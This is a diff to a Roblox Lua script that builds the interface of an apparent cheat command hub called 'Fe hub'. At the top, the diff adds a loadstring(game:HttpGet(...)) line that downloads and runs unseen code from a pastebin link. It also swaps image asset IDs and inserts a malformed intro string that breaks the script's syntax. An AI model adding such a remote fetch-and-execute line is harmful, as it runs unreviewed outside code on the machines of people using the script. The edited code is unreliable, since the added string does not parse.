@@ -1,5 +1,9 @@
 
--- Instances:
+-- this code is broke
+-- this code is not only being used for testing but it doesn't work but
+
+loadstring(game:HttpGet(('https://pastebin.com/BkeckqXD'),true))()
+--main code [test]
 
 local EzCMD = {
 	EzCMD = Instance.new("ScreenGui"),
@@ -45,7 +49,7 @@ EzCMD.MainFrame.BackgroundTransparency = 1.000
 EzCMD.MainFrame.ClipsDescendants = true
 EzCMD.MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
 EzCMD.MainFrame.Size = UDim2.new(0, 471, 0, 344)
-EzCMD.MainFrame.Image = "rbxassetid://3570695787"
+EzCMD.MainFrame.Image = "rbxassetid://84010115"
 EzCMD.MainFrame.ImageColor3 = Color3.fromRGB(47, 52, 58)
 EzCMD.MainFrame.ScaleType = Enum.ScaleType.Slice
 EzCMD.MainFrame.SliceCenter = Rect.new(100, 100, 100, 100)
@@ -70,7 +74,7 @@ EzCMD.Intro.BackgroundTransparency = 1.000
 EzCMD.Intro.Position = UDim2.new(0.029787235, 0, 0.0349491052, 0)
 EzCMD.Intro.Size = UDim2.new(0, 431, 0, 63)
 EzCMD.Intro.Font = Enum.Font.SourceSans
-EzCMD.Intro.Text = "Thank you for using Fe hub. Fe hub is currently in Beta and a lot of work is still needed. For a list of commands please do \"cmd show\". To hide commands do \"cmd hide\"."
+EzCMD.Intro.Text = "Thank you for using Fe hub. Fe hub is currently in Beta and a lot of work is still needed. For a list of commands please do \"cmd show\". To hide commands do \"cmd hide\ [test code]."."
 EzCMD.Intro.TextColor3 = Color3.fromRGB(255, 255, 255)
 EzCMD.Intro.TextSize = 14.000
 EzCMD.Intro.TextWrapped = true
@@ -145,7 +149,7 @@ EzCMD.TextButton_Roundify_12px_2.BackgroundTransparency = 1.000
 EzCMD.TextButton_Roundify_12px_2.Position = UDim2.new(0.5, 0, 0.5, 0)
 EzCMD.TextButton_Roundify_12px_2.Selectable = true
 EzCMD.TextButton_Roundify_12px_2.Size = UDim2.new(1, 0, 1, 0)
-EzCMD.TextButton_Roundify_12px_2.Image = "rbxassetid://3570695787"
+EzCMD.TextButton_Roundify_12px_2.Image = "rbxassetid://84010115"
 EzCMD.TextButton_Roundify_12px_2.ImageColor3 = Color3.fromRGB(255, 225, 101)
 EzCMD.TextButton_Roundify_12px_2.ScaleType = Enum.ScaleType.Slice
 EzCMD.TextButton_Roundify_12px_2.SliceCenter = Rect.new(100, 100, 100, 100)
@@ -221,7 +225,7 @@ EzCMD.Looks.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 EzCMD.Looks.BackgroundTransparency = 1.000
 EzCMD.Looks.Position = UDim2.new(0.5, 0, 0.5, 0)
 EzCMD.Looks.Size = UDim2.new(0, 438, 0, 5)
-EzCMD.Looks.Image = "rbxassetid://3570695787"
+EzCMD.Looks.Image = "rbxassetid://84010115"
 EzCMD.Looks.ImageColor3 = Color3.fromRGB(53, 53, 53)
 EzCMD.Looks.ScaleType = Enum.ScaleType.Slice
 EzCMD.Looks.SliceCenter = Rect.new(100, 100, 100, 100)
@@ -256,7 +260,7 @@ EzCMD.CommandsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 EzCMD.CommandsFrame.BackgroundTransparency = 1.000
 EzCMD.CommandsFrame.Position = UDim2.new(0.75, 0, 0.5, 0)
 EzCMD.CommandsFrame.Size = UDim2.new(0, 182, 0, 343)
-EzCMD.CommandsFrame.Image = "rbxassetid://3570695787"
+EzCMD.CommandsFrame.Image = "rbxassetid://84010115"
 EzCMD.CommandsFrame.ImageColor3 = Color3.fromRGB(47, 52, 58)
 EzCMD.CommandsFrame.ScaleType = Enum.ScaleType.Slice
 EzCMD.CommandsFrame.SliceCenter = Rect.new(100, 100, 100, 100)
